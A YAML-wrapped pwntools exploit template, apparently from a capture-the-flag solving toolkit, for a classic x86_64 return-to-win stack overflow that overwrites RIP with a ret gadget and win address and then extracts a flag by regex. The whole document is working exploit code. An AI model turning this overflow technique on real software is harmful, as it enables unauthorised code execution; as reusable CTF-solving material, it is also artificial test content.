exploit_template: |
  from pwn import *

  # Set target host and port
  host, port = "{TARGET_URL}".replace("http://", "").replace("https://", "").split(":")
  io = remote(host, int(port))

  # Offset to RIP (usually 40, 72, 88, 120, 136 bytes)
  offset = 40
  # win function address or ROP ret gadget for 16-byte stack alignment
  ret_gadget = 0x40101a
  win_addr = 0x401156

  payload = flat({
      offset: [ret_gadget, win_addr]
  })

  io.sendline(payload)
  flag = io.recvregex(r"(?:picoCTF|FLAG|CTF|HTB|THM)\{[^\}\s]+\}")
  print(f"FLAG:{flag.decode()}")
notes: "Classic x86_64 return-to-win with stack alignment 0x40101a ret gadget."
